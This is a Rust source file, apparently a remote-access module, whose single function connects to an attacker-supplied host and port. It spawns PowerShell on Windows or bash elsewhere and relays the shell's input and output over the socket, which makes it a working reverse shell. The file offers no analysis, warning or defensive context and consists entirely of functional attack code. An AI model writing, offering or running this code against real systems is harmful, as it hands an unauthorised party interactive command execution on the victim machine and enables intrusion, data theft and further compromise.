use std::thread;
use std::net::TcpStream;
use std::io::{BufReader, BufWriter, BufRead, Write};
use std::process::{Command, Stdio};
use std::env;

pub fn remacc_init() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        println!("usage: remacc host port");
    }
    else {
        let host = &args[1];
        let port = &args[2];
        match TcpStream::connect(format!("{}:{}", host, port)) {
            Ok(socket) => {
                let mut tcp_stdin = BufReader::new(socket.try_clone().unwrap());
                let mut tcp_stderr = BufWriter::new(socket.try_clone().unwrap());
                let mut tcp_stdout = BufWriter::new(socket);

                let command = if cfg!(target_os = "windows") {
                    "powershell.exe"
                } else {
                    "/bin/bash"
                };

                let mut process = Command::new(command)
                    .stdin(Stdio::piped())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .spawn().unwrap();
                let mut stdout = BufReader::new(process.stdout.take().unwrap());
                let mut stderr = BufReader::new(process.stderr.take().unwrap());
                let mut stdin = process.stdin.take().unwrap();
                thread::spawn(move || {
                    loop {
                        let mut output = vec![];
                        stdout.read_until(b' ', &mut output).expect("Failed to read stdout");
                        
                        match tcp_stdout.write(&output) {
                            Ok(0) | Err(_) => break,
                            Ok(_) => tcp_stdout.flush().expect("Failed to flush TCP stdout buffer")
                        }
                    }
                });
                thread::spawn(move || {
                    loop {
                        let mut output = vec![];
                        stderr.read_until(b'\n', &mut output).expect("Failed to read stderr");
                        
                        match tcp_stderr.write(&output) {
                            Ok(0) | Err(_) => break,
                            Ok(_) => tcp_stderr.flush().expect("Failed to flush TCP stderr buffer")
                        }
                    }
                });
                loop {
                    let mut command = String::new();

                    match tcp_stdin.read_line(&mut command) {
                        Ok(0) | Err(_) => break,
                        Ok(_) => stdin.write_all(command.as_bytes()).expect("Failed to write to stdin")
                    }
                }
            }
            Err(error) => {
                println!("Connection to the socket failed: {}", error);
            }
        }
    }
}